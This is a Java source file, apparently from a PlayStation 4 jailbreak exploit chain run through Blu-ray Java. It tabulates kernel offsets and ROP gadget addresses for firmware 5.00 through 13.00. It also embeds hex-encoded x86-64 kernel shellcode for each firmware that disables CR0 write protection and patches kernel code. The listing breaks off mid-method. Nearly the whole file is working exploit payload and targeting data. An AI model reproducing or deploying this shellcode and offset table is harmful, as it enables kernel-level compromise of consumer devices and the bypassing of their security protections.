package org.bdj.external;

import java.util.Hashtable;

public class KernelOffset {

        // proc structure
        public static final int PROC_PID = 0xb0;
        public static final int PROC_FD = 0x48;
        public static final int PROC_VM_SPACE = 0x200;
        public static final int PROC_COMM = 0x448;
        public static final int PROC_SYSENT = 0x470;

        // filedesc
        public static final int FILEDESC_OFILES = 0x0;
        public static final int SIZEOF_OFILES = 0x8;

        // vmspace structure
        public static final int VMSPACE_VM_PMAP = 0x1C8;
        public static final int VMSPACE_VM_VMID = 0x1D4;

        // pmap structure
        public static final int PMAP_CR3 = 0x28;

        // network
        public static final int SO_PCB = 0x18;
        public static final int INPCB_PKTOPTS = 0x118;

        // PS4 IPv6 structure
        public static final int PS4_OFF_TCLASS = 0xb0;
        public static final int PS4_OFF_IP6PO_RTHDR = 0x68;

        private static Hashtable ps4KernelOffsets;
        private static Hashtable shellcodeData;
        private static String currentFirmware = null;

        static {
                initializePS4Offsets();
                initializeShellcodes();
        }

        private static void initializePS4Offsets() {
                ps4KernelOffsets = new Hashtable();

                // PS4 5.00/5.01
                addFirmwareOffsets("5.00", 0X7B3ED4L, 0X10986A0L, 0X22C19F0L, 0L, 0X1084200L,
                                0X13460L, 0L);
                addFirmwareOffsets("5.01", 0X7B3ED4L, 0X10986A0L, 0X22C19F0L, 0L, 0X1084200L,
                                0X13460L, 0L);

                // PS4 5.03
                addFirmwareOffsets("5.03", 0X7B42E4L, 0X10986A0L, 0X22C1A70L, 0L, 0X1084200L,
                                0X13460L, 0L);

                // PS4 5.05/5.07
                addFirmwareOffsets("5.05", 0X7B42A4L, 0X10986A0L, 0X22C1A70L, 0L, 0X1084200L,
                                0X13460L, 0L);
                addFirmwareOffsets("5.07", 0X7B42A4L, 0X10986A0L, 0X22C1A70L, 0L, 0X1084200L,
                                0X13460L, 0L);

                // PS4 5.50
                addFirmwareOffsets("5.50", 0X80EF12L, 0X1134180L, 0X22EF570L, 0L, 0X111D8B0L,
                                0XAF8CL, 0L);

                // PS4 5.53
                addFirmwareOffsets("5.53", 0X80EDE2L, 0X1134180L, 0X22EF570L, 0L, 0X111D8B0L,
                                0XAF8CL, 0L);

                // PS4 5.55
                addFirmwareOffsets("5.55", 0X80F482L, 0X1139180L, 0X22F3570L, 0L, 0X11228B0L,
                                0XAF8CL, 0L);

                // PS4 5.56
                addFirmwareOffsets("5.56", 0X7C8971L, 0X1139180L, 0X22F3570L, 0L, 0X1123130L,
                                0X3F0C9L, 0L);

                // PS4 6.00/6.02
                addFirmwareOffsets("6.00", 0X7C8971L, 0X1139458L, 0X21BFAC0L, 0L, 0X1123130L,
                                0X3F0C9L, 0L);
                addFirmwareOffsets("6.02", 0X7C8971L, 0X1139458L, 0X21BFAC0L, 0L, 0X1123130L,
                                0X3F0C9L, 0L);

                // PS4 6.20
                addFirmwareOffsets("6.20", 0X7C8E31L, 0X113D458L, 0X21C3AC0L, 0L, 0X1127130L,
                                0X2BE6EL, 0L);

                // PS4 6.50
                addFirmwareOffsets("6.50", 0X7C6019L, 0X113D4F8L, 0X2300320L, 0L, 0X1124BF0L,
                                0X15A50DL, 0L);

                // PS4 6.51
                addFirmwareOffsets("6.51", 0X7C6099L, 0X113D4F8L, 0X2300320L, 0L, 0X1124BF0L,
                                0X15A50DL, 0L);

                // PS4 6.70/6.71/6.72
                addFirmwareOffsets("6.70", 0X7C7829L, 0X113E518L, 0X2300320L, 0L, 0X1125BF0L,
                                0X9D11DL, 0L);
                addFirmwareOffsets("6.71", 0X7C7829L, 0X113E518L, 0X2300320L, 0L, 0X1125BF0L,
                                0X9D11DL, 0L);
                addFirmwareOffsets("6.72", 0X7C7829L, 0X113E518L, 0X2300320L, 0L, 0X1125BF0L,
                                0X9D11DL, 0L);

                // PS4 7.00/7.01/7.02
                addFirmwareOffsets("7.00", 0X7F92CBL, 0X113E398L, 0X22C5750L, 0L, 0X112D250L,
                                0X6B192L, 0L);
                addFirmwareOffsets("7.01", 0X7F92CBL, 0X113E398L, 0X22C5750L, 0L, 0X112D250L,
                                0X6B192L, 0L);
                addFirmwareOffsets("7.02", 0X7F92CBL, 0X113E398L, 0X22C5750L, 0L, 0X112D250L,
                                0X6B192L, 0L);

                // PS4 7.50
                addFirmwareOffsets("7.50", 0X79A92EL, 0X113B728L, 0X1B463E0L, 0L, 0X1129F30L,
                                0X1F842L, 0L);

                // PS4 7.51/7.55
                addFirmwareOffsets("7.51", 0X79A96EL, 0X113B728L, 0X1B463E0L, 0L, 0X1129F30L,
                                0X1F842L, 0L);
                addFirmwareOffsets("7.55", 0X79A96EL, 0X113B728L, 0X1B463E0L, 0L, 0X1129F30L,
                                0X1F842L, 0L);

                // PS4 8.00/8.01/8.02/8.03
                addFirmwareOffsets("8.00", 0X7EDCFFL, 0X111A7D0L, 0X1B8C730L, 0L, 0X11040C0L,
                                0XE629CL, 0L);
                addFirmwareOffsets("8.01", 0X7EDCFFL, 0X111A7D0L, 0X1B8C730L, 0L, 0X11040C0L,
                                0XE629CL, 0L);
                addFirmwareOffsets("8.02", 0X7EDCFFL, 0X111A7D0L, 0X1B8C730L, 0L, 0X11040C0L,
                                0XE629CL, 0L);
                addFirmwareOffsets("8.03", 0X7EDCFFL, 0X111A7D0L, 0X1B8C730L, 0L, 0X11040C0L,
                                0XE629CL, 0L);

                // PS4 8.50/8.52
                addFirmwareOffsets("8.50", 0X7DA91CL, 0X111A8F0L, 0X1C66150L, 0L, 0X11041B0L,
                                0XC810DL, 0L);
                addFirmwareOffsets("8.52", 0X7DA91CL, 0X111A8F0L, 0X1C66150L, 0L, 0X11041B0L,
                                0XC810DL, 0L);

                // PS4 9.00
                addFirmwareOffsets("9.00", 0x7f6f27L, 0x111f870L, 0x21eff20L, 0x221688dL, 0x1107f00L, 0x4c7adL,
                                0x3977F0);

                // PS4 9.03/9.04
                addFirmwareOffsets("9.03", 0x7f4ce7L, 0x111b840L, 0x21ebf20L, 0x221288dL, 0x1103f00L, 0x5325bL,
                                0x3959F0);
                addFirmwareOffsets("9.04", 0x7f4ce7L, 0x111b840L, 0x21ebf20L, 0x221288dL, 0x1103f00L, 0x5325bL,
                                0x3959F0);

                // PS4 9.50/9.51/9.60
                addFirmwareOffsets("9.50", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL,
                                0x85EE0);
                addFirmwareOffsets("9.51", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL,
                                0x85EE0);
                addFirmwareOffsets("9.60", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL,
                                0x85EE0);

                // PS4 10.00/10.01
                addFirmwareOffsets("10.00", 0x7b5133L, 0x111b8b0L, 0x1b25bd0L, 0x1b9e08dL, 0x110a980L, 0x68b1L,
                                0x45B10);
                addFirmwareOffsets("10.01", 0x7b5133L, 0x111b8b0L, 0x1b25bd0L, 0x1b9e08dL, 0x110a980L, 0x68b1L,
                                0x45B10);

                // PS4 10.50/10.70/10.71
                addFirmwareOffsets("10.50", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL,
                                0x25E330);
                addFirmwareOffsets("10.70", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL,
                                0x25E330);
                addFirmwareOffsets("10.71", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL,
                                0x25E330);

                // PS4 11.00
                addFirmwareOffsets("11.00", 0x7fc26fL, 0x111f830L, 0x2116640L, 0x221c60dL, 0x1109350L, 0x71a21L,
                                0x58F10);

                // PS4 11.02
                addFirmwareOffsets("11.02", 0x7fc22fL, 0x111f830L, 0x2116640L, 0x221c60dL, 0x1109350L, 0x71a21L,
                                0x58F10);

                // PS4 11.50/11.52
                addFirmwareOffsets("11.50", 0x784318L, 0x111fa18L, 0x2136e90L, 0x21cc60d, 0x110a760L, 0x704d5L,
                                0xE6C20);
                addFirmwareOffsets("11.52", 0x784318L, 0x111fa18L, 0x2136e90L, 0x21cc60d, 0x110a760L, 0x704d5L,
                                0xE6C20);

                // PS4 12.00/12.02
                addFirmwareOffsets("12.00", 0x784798L, 0x111fa18L, 0x2136e90L, 0x21cc60dL, 0x110a760L, 0x47b31L,
                                0xE6C20);
                addFirmwareOffsets("12.02", 0x784798L, 0x111fa18L, 0x2136e90L, 0x21cc60dL, 0x110a760L, 0x47b31L,
                                0xE6C20);

                // PS4 12.50/12.52/13.00, fill only really needed ones
                addFirmwareOffsets("12.50", 0L, 0x111fa18L, 0x2136e90L, 0L, 0x110a760L, 0x47b31L, 0xE6C20);
                addFirmwareOffsets("12.52", 0L, 0x111fa18L, 0x2136e90L, 0L, 0x110a760L, 0x47b31L, 0xE6C20);
                addFirmwareOffsets("13.00", 0L, 0x111fa18L, 0x2136e90L, 0L, 0x110a760L, 0x47b31L, 0xE6C20);
        }

        private static void initializeShellcodes() {
                shellcodeData = new Hashtable();

                shellcodeData.put("5.00",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb04000041b890e9ffff4881c2a0320100c681bd0a0000ebc6816da31e00ebc681b1a31e00ebc6812da41e00ebc68171a41e00ebc6810da61e00ebc6813daa1e00ebc681fdaa1e00ebc7819304000000000000c681c5040000eb668981bc0400006689b1b8040000c6817d4a0500eb6689b9f83a1a00664489812a7e2300c78150232b004831c0c3c68110d5130037c68113d5130037c78120c807010200000048899128c80701c7814cc80701010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("5.03",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb04000041b890e9ffff4881c2a0320100c681bd0a0000ebc6817da41e00ebc681c1a41e00ebc6813da51e00ebc68181a51e00ebc6811da71e00ebc6814dab1e00ebc6810dac1e00ebc7819304000000000000c681c5040000eb668981bc0400006689b1b8040000c6817d4a0500eb6689b9083c1a00664489813a7f2300c78120262b004831c0c3c68120d6130037c68123d6130037c78120c807010200000048899128c80701c7814cc80701010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("5.50",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c2ccad0000c681ed0a0000ebc6810d594000ebc68151594000ebc681cd594000ebc681115a4000ebc681bd5b4000ebc6816d604000ebc6813d614000ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681cd070100eb6644898198ee0200664489890a390600c781300140004831c0c3c681d9253c0037c681dc253c0037c781d05e110102000000488991d85e1101c781fc5e1101010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("5.53",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c2ccad0000c681ed0a0000ebc6810d584000ebc68151584000ebc681cd584000ebc68111594000ebc681bd5a4000ebc6816d5f4000ebc6813d604000ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681cd070100eb6644898198ee0200664489890a390600c781300040004831c0c3c681d9243c0037c681dc243c0037c781d05e110102000000488991d85e1101c781fc5e1101010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("5.55",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c2ccad0000c681ed0a0000ebc681cd5b4000ebc681115c4000ebc6818d5c4000ebc681d15c4000ebc6817d5e4000ebc6812d634000ebc681fd634000ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681cd070100eb6644898198ee0200664489890a390600c781f00340004831c0c3c68199283c0037c6819c283c0037c781d0ae110102000000488991d8ae1101c781fcae1101010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("5.56",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c209ef0300c681dd0a0000ebc6814d461100ebc68191461100ebc6810d471100ebc68151471100ebc681fd481100ebc681ad4d1100ebc6817d4e1100ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681ed900200eb6644898158223500664489895af62700c78110a801004831c0c3c6816d02240037c6817002240037c78150b711010200000048899158b71101c7817cb71101010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("6.20",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c2aebc0200c681dd0a0000ebc6814d461100ebc68191461100ebc6810d471100ebc68151471100ebc681fd481100ebc681ad4d1100ebc6817d4e1100ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681ed900200eb6644898178223500664489897af62700c78110a801004831c0c3c6816d02240037c6817002240037c78150f711010200000048899158f71101c7817cf71101010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("6.50",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb0000006689810ec5630041b9eb00000041baeb04000041bb90e9ffffb890e9ffff4881c24da31500c681cd0a0000ebc6814d113c00ebc68191113c00ebc6810d123c00ebc68151123c00ebc681fd133c00ebc681ad183c00ebc6817d193c00eb6689b10fce6300c78190040000000000006689b9c604000066448981bd04000066448989b9040000c68127bb1000eb66448991081a4500664489991e801d00668981aa851d00c781209f41004831c0c3c6817ab50a0037c6817db50a0037c78110d211010200000048899118d21101c7813cd21101010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("6.70",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb000000668981cec8630041b9eb00000041baeb04000041bb90e9ffffb890e9ffff4881c25dcf0900c681cd0a0000ebc681fd143c00ebc68141153c00ebc681bd153c00ebc68101163c00ebc681ad173c00ebc6815d1c3c00ebc6812d1d3c00eb6689b1cfd16300c78190040000000000006689b9c604000066448981bd04000066448989b9040000c681d7be1000eb66448991b81d450066448999ce831d006689815a891d00c781d0a241004831c0c3c6817ab50a0037c6817db50a0037c78110e211010200000048899118e21101c7813ce21101010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("7.00",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb000000668981ceac630041b9eb00000041baeb04000041bb90e9ffffb890e9ffff4881c2d2af0600c681cd0a0000ebc6818def0200ebc681d1ef0200ebc6814df00200ebc68191f00200ebc6813df20200ebc681edf60200ebc681bdf70200eb6689b1efb56300c78190040000000000006689b9c604000066448981bd04000066448989b9040000c681777b0800eb66448991084c260066448999c14e09006689817b540900c781202c2f004831c0c3c68136231d0037c68139231d0037c781705812010200000048899178581201c7819c581201010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb070000c681b11b4a00eb668981ee1b4a0048b84183bfa004000000488981f71b4a00b8498bffffc681ff1b4a0090c681081c4a0087c681151c4a00b7c6812d1c4a0087c6813a1c4a00b7c681521c4a00bfc6815e1c4a00bfc6816a1c4a00bfc681761c4a00bf668981851c4a00c681871c4a00ff0f20c0480d000001000f22c031c0c3");

                shellcodeData.put("7.50",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb0000006689819473630041b9eb00000041baeb04000041bb90e9ffffb890e9ffff4881c282f60100c681dd0a0000ebc6814df72800ebc68191f72800ebc6810df82800ebc68151f82800ebc681fdf92800ebc681adfe2800ebc6817dff2800eb6689b1cf7c6300c78190040000000000006689b9c604000066448981bd04000066448989b9040000c68127a33700eb66448991c814300066448999041e4500668981c4234500c781309a02004831c0c3c6817db10d0037c68180b10d0037c781502512010200000048899158251201c7817c251201010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb030000ba0500000031f631ff668981f5200b0041b80100000048b84183bea00400000041b901000000488981fa200b00b80400000041ba4c89ffff6689810c210b00b80400000066898119210b00b805000000c78103220b00e9f2feffc68107220b00ffc78108210b00498b86d0c6810e210b0000c78115210b00498bb6b0c6811b210b0000c7812d210b00498b864066898131210b00c68133210b0000c7813a210b00498bb6206689913e210b00c68140210b0000c78152210b00498dbec06689b156210b00c68158210b0000c7815e210b00498dbee06689b962210b00c68164210b0000c78171210b00498dbe006644898175210b00c68177210b0000c7817d210b00498dbe206644898981210b00c68183210b0000664489918e210b00c68190210b00f70f20c0480d000001000f22c031c0c3");

                shellcodeData.put("8.00",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2dc600e0066898154d26200c681cd0a0000ebc6810de12500ebc68151e12500ebc681cde12500ebc68111e22500ebc681bde32500ebc6816de82500ebc6813de92500eb6689b13fdb6200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68196d63400eb664489898bc63e0066448991848d3100c6813f953100ebc781c05109004831c0c3c6813ad00f0037c6813dd00f0037c781e0c60f0102000000488991e8c60f01c7810cc70f01010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb06000041bbeb48000031d231f666898183f10900bf0100000048b84183bfa00400000041b8010000004889818bf10900b80400000041b9498bffff6689819df10900b804000000668981aaf10900b805000000668981c2f10900b8050000006644899941f10900c78199f10900498b87d0c6819ff1090000c781a6f10900498bb7b0c681acf1090000c781bef10900498b8740c681c4f1090000c781cbf10900498bb720668981cff10900c681d1f1090000c781e3f10900498dbfc0668991e7f10900c681e9f1090000c781eff10900498dbfe06689b1f3f10900c681f5f1090000c78102f20900498dbf006689b906f20900c68108f2090000c7810ef20900498dbf206644898112f20900c68114f2090000664489891ff20900c68121f20900ff0f20c0480d000001000f22c031c0c3");

                shellcodeData.put("8.50",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c24d7f0c0066898174466200c681cd0a0000ebc6813d403a00ebc68181403a00ebc681fd403a00ebc68141413a00ebc681ed423a00ebc6819d473a00ebc6816d483a00eb6689b15f4f6200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681d6f32200eb66448989dbd614006644899174740100c6812f7c0100ebc78140d03a004831c0c3c681ea26080037c681ed26080037c781d0c70f0102000000488991d8c70f01c781fcc70f01010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb06000041bbeb48000031d231f666898163020300bf0100000048b84183bfa00400000041b8010000004889816b020300b80400000041b9498bffff6689817d020300b8040000006689818a020300b805000000668981a2020300b8050000006644899921020300c78179020300498b87d0c6817f02030000c78186020300498bb7b0c6818c02030000c7819e020300498b8740c681a402030000c781ab020300498bb720668981af020300c681b102030000c781c3020300498dbfc0668991c7020300c681c902030000c781cf020300498dbfe06689b1d3020300c681d502030000c781e2020300498dbf006689b9e6020300c681e802030000c781ee020300498dbf2066448981f2020300c681f40203000066448989ff020300c68101030300ff0f20c0480d000001000f22c031c0c3");

                shellcodeData.put("9.00",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000ebc7818d0b08000000000066448989c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("9.03",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000ebc7818d0b0800000000006644898994ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("9.50",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00ebc7813d6d1900000000006644898924f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("10.00",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2f166000066898164e86100c681cd0a0000ebc6816d2c4700ebc681b12c4700ebc6812d2d4700ebc681712d4700ebc6811d2f4700ebc681cd334700ebc6819d344700eb6689b14ff16100c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68156772600ebc7817d2039000000000066448989a4fa1800c6815f021900ebc78140ea1b004831c0c3c6819ad50e0037c6819dd50e0037c781a02f100102000000488991a82f1001c781cc2f1001010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("10.50",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb0000006689811330210041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800ebc781eeb2470000000000668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("11.00",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300ebc781eec8350000000000668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("11.02",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300ebc7810ec935000000000066898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("11.50",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900ebc781aebe2f000000000066898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("12.00",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("12.50",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("13.00",
                                "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8eb04000041b9eb00000041baeb0000006689814cc12f0041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981847b6200c681cd0a0000ebc6812dd42b00ebc68171d42b00ebc681edd42b00ebc68131d52b00ebc681ddd62b00ebc6818ddb2b00ebc6815ddc2b00eb664489896f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68146153900eb668981a4711b00c78158771b0090e93c01c781c0d83b004831c0c3c6817aa71f0037c6817da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");

                shellcodeData.put("5.01", shellcodeData.get("5.00"));
                shellcodeData.put("5.05", shellcodeData.get("5.03"));
                shellcodeData.put("5.07", shellcodeData.get("5.03"));
                shellcodeData.put("6.51", shellcodeData.get("6.50"));
                shellcodeData.put("6.71", shellcodeData.get("6.70"));
                shellcodeData.put("6.72", shellcodeData.get("6.70"));
                shellcodeData.put("7.01", shellcodeData.get("7.00"));
                shellcodeData.put("7.02", shellcodeData.get("7.00"));
                shellcodeData.put("7.51", shellcodeData.get("7.50"));
                shellcodeData.put("7.52", shellcodeData.get("7.50"));
                shellcodeData.put("8.01", shellcodeData.get("8.00"));
                shellcodeData.put("8.03", shellcodeData.get("8.00"));
                shellcodeData.put("8.52", shellcodeData.get("8.50"));
                shellcodeData.put("9.04", shellcodeData.get("9.03"));
                shellcodeData.put("9.51", shellcodeData.get("9.50"));
                shellcodeData.put("9.60", shellcodeData.get("9.50"));
                shellcodeData.put("10.01", shellcodeData.get("10.00"));
                shellcodeData.put("10.70", shellcodeData.get("10.50"));
                shellcodeData.put("10.71", shellcodeData.get("10.50"));
                shellcodeData.put("11.52", shellcodeData.get("11.50"));
                shellcodeData.put("12.02", shellcodeData.get("12.00"));
                shellcodeData.put("12.52", shellcodeData.get("12.50"));
        }

        private static void addFirmwareOffsets(String fw, long evf, long prison0, long rootvnode,
                        long targetId, long sysent661, long jmpRsi, long klLock) {
                Hashtable offsets = new Hashtable();
                offsets.put("EVF_OFFSET", new Long(evf));
                offsets.put("PRISON0", new Long(prison0));
                offsets.put("ROOTVNODE", new Long(rootvnode));
                offsets.put("TARGET_ID_OFFSET", new Long(targetId));
                offsets.put("SYSENT_661_OFFSET", new Long(sysent661));
                offsets.put("JMP_RSI_GADGET", new Long(jmpRsi));
                offsets.put("KL_LOCK", new Long(klLock));
                ps4KernelOffsets.put(fw, offsets);
        }

        public static String getFirmwareVersion() {
                if (currentFirmware == null) {
                        currentFirmware = Helper.getCurrentFirmwareVersion();
                }
                return currentFirmware;
        }

        public static boolean hasPS4Offsets() {
                return ps4KernelOffsets.containsKey(getFirmwareVersion());
        }

        public static long getPS4Offset(String offsetName) {
                String fw = getFirmwareVersion();
                Hashtable offsets = (Hashtable) ps4KernelOffsets.get(fw);
                if (offsets == null) {
                        throw new RuntimeException("No offsets available for firmware " + fw);
                }

                Long offset = (Long) offsets.get(offsetName);
                if (offset == null) {
                        throw new RuntimeException("Offset " + offsetName + " not found for firmware " + fw);
                }

                return offset.longValue();
        }

        public static boolean shouldApplyKernelPatches() {
                return hasPS4Offsets() && hasShellcodeForCurrentFirmware();
        }

        public static byte[] getKernelPatchesShellcode() {
